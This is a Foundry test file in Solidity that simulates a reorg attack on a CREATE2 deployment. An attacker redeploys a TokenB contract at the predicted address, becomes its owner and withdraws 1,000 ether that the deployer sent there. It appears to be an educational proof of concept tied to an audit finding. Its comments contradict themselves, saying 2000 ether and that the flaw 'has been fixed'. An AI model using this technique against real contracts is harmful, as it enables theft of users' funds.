/*
  1. The regor attack occurs when a blockchain reorg occurs (https://github.com/code-423n4/2023-04-caviar-findings/issues/871)
     and a user uses create2 to deploy a contract. 
  2. The contract has been deployed but revsered due to the reorg. Meanwhile, the deployer sents some rewards to the deployed address.abi
  3. The attacker observes the reorg event, then redeploy the contract using create2. Thus the deloyed address is the same.abi
  4. Now the attacker becomes the owner, and withdraw the rewards of ETH stored by the deployer in the contract.
*/



// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console2} from "forge-std/Test.sol";
import {PPSwap} from "../..//src/reorg-attack/PPSwap.sol";
import {TokenB} from "../../src/reorg-attack/TokenB.sol";
import {TokenBFactory} from "../../src/reorg-attack/TokenBFactory.sol";


contract TokenBTest is Test {
    PPSwap ppswap;
    TokenB tokenB;
    TokenBFactory tokenBFactory;
    address deployer = makeAddr("deployer");
    bytes32 salt_ = keccak256(abi.encode("my salt"));
    address attacker = makeAddr("attacker");
    

    function setUp() public {
        ppswap = new PPSwap();
        ppswap.transfer(deployer, 2000 ether);    
        vm.prank(deployer);
        tokenBFactory = new TokenBFactory();
    }

    function testReorgAttack() public{
         // the deployer deploys TokenB and sends 2000 ether rewards to the contract
         // of course, the deployment actually fails due to reorg
         simulateDeployWithReorg();

         // the attacker observe the reorg occurs, and then redeploy TokenB immediately
         vm.startPrank(attacker);
         tokenB = tokenBFactory.deployTokenB(address(ppswap), salt_);

         // the attacker becomes the owner so he can retrieve the ETH stored by the deployer
         tokenB.withdrawETH();
         vm.stopPrank();

         console2.log("ETH balance of attacker", attacker.balance);
         assertEq(attacker.balance, 1000 ether);  // the vulnerability for reorg attack has been fixed. 
    }

 
    function simulateDeployWithReorg() public{
       // I commented the following line out means, the deployment actually fails due to 
       // reorg, but the deployer will not know since the attacker will deploy immediately instead
      
       vm.startPrank(deployer);
       // tokenB = tokenBFactory.deployTokenB(address(ppswap), salt_);
 
       tokenB = TokenB(calculateDeploymentAddress(address(tokenBFactory), salt_, type(TokenB).creationCode, address(ppswap)));
       deal(deployer, 1000 ether); 

       // send 1000 ether rewards to the contract
       (bool success, ) = address(tokenB).call{value: 1000 ether}("");
       require(success);
    }

    function calculateDeploymentAddress(
        address creator,
        bytes32 salt,
        bytes memory bytecode,
        address arg1
    ) public pure returns (address) {
        // Use the CREATE2 opcode to calculate the deployment address
        return address(uint160(uint(keccak256(abi.encodePacked(
            bytes1(0xff),
            creator,
            salt,
            keccak256(abi.encodePacked(
                bytecode,
                abi.encode(arg1)
            )
        ))))));
    }

}
